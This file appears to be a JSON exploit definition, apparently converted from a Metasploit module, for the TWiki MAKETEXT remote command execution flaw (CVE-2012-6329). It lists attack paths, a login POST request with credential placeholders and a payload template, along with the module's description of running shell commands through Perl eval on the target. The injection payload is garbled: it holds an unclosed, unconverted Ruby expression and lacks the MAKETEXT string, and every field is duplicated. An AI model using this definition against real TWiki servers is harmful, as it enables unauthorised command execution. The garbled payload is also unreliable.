{
   "type" : "MSF",
   "path" : "#{@base}do/save#{@page}?",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "detection" : {},
   "informations" : {
      "VARIABLES" : {
         "CRYPTTOKEN" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "SESSION" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "USERNAME" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "PASSWORD" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         }
      },
      "MSF_MODULE" : "twiki_maketext",
      "TITLE" : "TWiki MAKETEXT Remote Command Execution",
      "CVE" : "CVE-2012-6329",
      "OSVDB" : 88460,
      "name" : "TwikiMaketext",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "PATH" : "do/login",
            "METHOD" : "POST",
            "PAYLOAD" : "username=__USERNAME__&password=__PASSWORD__",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "TEXT" : "Sending Exploit #2 Request : [POST] /do/login",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         }
      },
      "PAYLOAD" : "crypttoken=__CRYPTTOKEN__&text=#{rand_text_alpha(3+rand(3))&",
      "DESCRIPTION" : "\n\n          This module exploits a vulnerability in the MAKETEXT Twiki variable. By using a\n\n        specially crafted MAKETEXT, a malicious user can execute shell commands since user\n\n        input is passed to the Perl \"eval\" command without first being sanitized. The\n\n        problem is caused by an underlying security issue in the CPAN:Locale::Maketext\n\n        module. This works in TWiki sites that have user interface localization enabled\n\n        (UserInterfaceInternationalisation variable set).\n\n\n\n        If USERNAME and PASSWORD aren't provided, anonymous access will be tried. Also,\n\n        if the 'TwikiPage' option isn't provided, the module will try to create a random\n\n        page on the SandBox space.  The module has been tested successfully on\n\n        TWiki 5.1.2 as distributed with the official TWiki-VM-5.1.2-1 virtual machine.\n\n      ",
      "METHOD" : "GET",
      "PATH" : "#{@base}do/save#{@page}?",
      "REFERENCES" : [
         "http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2012-6329"
      ],
      "PATHS" : [
         "__\\@BASE__do/login",
         "__\\@BASE__do/edit__\\@PAGE__",
         "#{@base}do/save#{@page}"
      ],
      "TYPE" : "MSF",
      "PLATFORM" : "UNIX"
   },
   "platform" : "UNIX",
   "method" : "GET",
   "description" : "\n\n          This module exploits a vulnerability in the MAKETEXT Twiki variable. By using a\n\n        specially crafted MAKETEXT, a malicious user can execute shell commands since user\n\n        input is passed to the Perl \"eval\" command without first being sanitized. The\n\n        problem is caused by an underlying security issue in the CPAN:Locale::Maketext\n\n        module. This works in TWiki sites that have user interface localization enabled\n\n        (UserInterfaceInternationalisation variable set).\n\n\n\n        If USERNAME and PASSWORD aren't provided, anonymous access will be tried. Also,\n\n        if the 'TwikiPage' option isn't provided, the module will try to create a random\n\n        page on the SandBox space.  The module has been tested successfully on\n\n        TWiki 5.1.2 as distributed with the official TWiki-VM-5.1.2-1 virtual machine.\n\n      ",
   "payload" : "crypttoken=__CRYPTTOKEN__&text=#{rand_text_alpha(3+rand(3))&",
   "title" : "TWiki MAKETEXT Remote Command Execution",
   "variables" : {
      "CRYPTTOKEN" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "SESSION" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "PASSWORD" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "USERNAME" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      }
   },
   "name" : "TwikiMaketext",
   "cve" : "CVE-2012-6329",
   "msf_module" : "twiki_maketext",
   "references" : [
      "http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2012-6329"
   ],
   "requests" : {
      "EXPLOIT2" : {
         "PATH" : "do/login",
         "METHOD" : "POST",
         "PAYLOAD" : "username=__USERNAME__&password=__PASSWORD__",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "TEXT" : "Sending Exploit #2 Request : [POST] /do/login",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      }
   },
   "paths" : [
      "__\\@BASE__do/login",
      "__\\@BASE__do/edit__\\@PAGE__",
      "#{@base}do/save#{@page}"
   ],
   "osvdb" : 88460
}
